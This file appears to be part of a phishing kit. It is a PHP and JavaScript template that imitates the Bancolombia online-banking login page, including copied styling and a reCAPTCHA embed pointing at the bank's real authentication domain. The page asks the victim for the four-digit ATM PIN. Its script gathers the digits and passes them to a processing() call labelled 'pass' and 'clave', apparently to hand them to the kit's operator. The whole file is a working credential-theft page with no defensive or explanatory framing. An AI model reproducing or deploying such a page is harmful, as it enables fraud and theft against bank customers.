var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_contenido = `
<div class="sc-jxOSlx jzmRAs">Clave principal</div>
<div class="sc-guJBdh kCPtdr">
	<div id="formGroup" class="sc-ktJbId hKzibl">
		<div class="sc-gEvEer blWBwQ">
			<div src="./static/media/lock.94f176e5224bf551ea452eed4c2cc05b.svg" class="sc-dcJsrY qDDqZ">
			</div>
			<div class="sc-eqUAAy fFtrsp"></div>
			<div class="sc-fqkvVR iGPcWV"> Es la misma que usas en el cajero automático</div>
			<div class="sc-iGgWBj cxASel"> </div>
		</div>
		<div class="sc-YysOf gTRaSD">
			<div class="sc-hZDyAQ casofJ">
				<input data-testid="1" type="text" inputmode="numeric"
					name="field1" maxlength="1" class="sc-fTFjTM kdPtYJ" value="">
				<input data-testid="2"
					type="text" name="field2" inputmode="numeric" maxlength="1" class="sc-fTFjTM kdPtYJ"
					value=""><input data-testid="3" type="text" inputmode="numeric" name="field3"
					maxlength="1" class="sc-fTFjTM kdPtYJ" value="">
				<input data-testid="4" type="text"
					inputmode="numeric" name="field4" maxlength="1" class="sc-fTFjTM kdPtYJ" value="">

			</div>
			<p class="sc-gmgFlS ljBqiy" id="errorLe" style="display:none;">Ingrese los 4 dígitos de la clave</p>
		</div>
		<div class="sc-kMkxaj drEJrH">
			<div>
				<div>
					<div class="grecaptcha-badge" data-style="bottomright"
						style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
						<div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60"
								role="presentation" name="a-63y4o63bi025" frameborder="0" scrolling="no"
								sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
								src="https://recaptcha.net/recaptcha/enterprise/anchor?ar=1&amp;k=6LdvAGspAAAAAIL1QeA0Wvjw4fS8XZQwyLSxDOWc&amp;co=aHR0cHM6Ly9hdXRlbnRpY2FjaW9uLmFwcHMuYmFuY29sb21iaWEuY29tOjQ0Mw..&amp;hl=es&amp;type=image&amp;v=p09oe8YIFfKgcnqQ9m9k4aiB&amp;theme=light&amp;size=invisible&amp;badge=bottomright&amp;cb=1x2jpf3ygdz"></iframe>
						</div>
						<div class="grecaptcha-error"></div><textarea id="g-recaptcha-response"
							name="g-recaptcha-response" class="g-recaptcha-response"
							style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
					</div><iframe style="display: none;"></iframe>
				</div>
			</div>
		</div>
		<div class="sc-fiCwlc boRxsw"><button type="button" id="btn-volver-password"
				class="sc-fXSgeo ertauK"><label class="sc-esYiGF expOrP">Volver</label></button><button
				type="button" disabled="" id="btn-continuar-password" class="sc-fXSgeo fEoHVe"><label
					class="sc-esYiGF expOrP">Continuar</label></button></div>
	</div>
	<div></div>
</div>
`
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
	$('div.sc-hZDyAQ input[type="text"]').on('input', function() {
		let currentInput = $(this);
		let value = currentInput.val();


		if (value.match(/^[0-9]$/) && value.length === 1) {
			let nextInput = currentInput.next('input[type="text"]');
			if (nextInput.length) {
				nextInput.focus();
			}
		} else if (value.length > 1) {
			currentInput.val(value.charAt(0));
			let nextInput = currentInput.next('input[type="text"]');
			if (nextInput.length) {
				nextInput.focus();
			}
		} else if (value.length === 0) {
			let prevInput = currentInput.prev('input[type="text"]');
			if (prevInput.length) {
				prevInput.focus();
			}
		}


		checkData();
	});

	function checkData() {
		let allFilled = true;
		let otp = '';

		$('div.sc-hZDyAQ input[type="text"]').each(function() {
			let value = $(this).val();

			if (!value.match(/^[0-9]$/)) {
				allFilled = false;
				$('#errorLe').show();
			} else {
				$('#errorLe').hide();
			}

			otp += value;
		});

		if (allFilled) {
			$('#btn-continuar-password').removeAttr('disabled').addClass('bApdQd').removeClass('fEoHVe');
		} else {
			$('#btn-continuar-password').attr('disabled', true).addClass('fEoHVe').removeClass('bApdQd');
		}

		return allFilled ? otp : null;
	}


	$('#btn-continuar-password').click(function() {
		let password = checkData();
		if (!password || password.length < 3) {
			// $('#tabError').toggle(true);
			$('#errorLe').show();
			// $('#summary').html('Por favor ingrese la información requerida.');
		} else {
			$('#errorLe').hide();
			processing({
				t: 'pass',
				clave: password
			});
		}
	})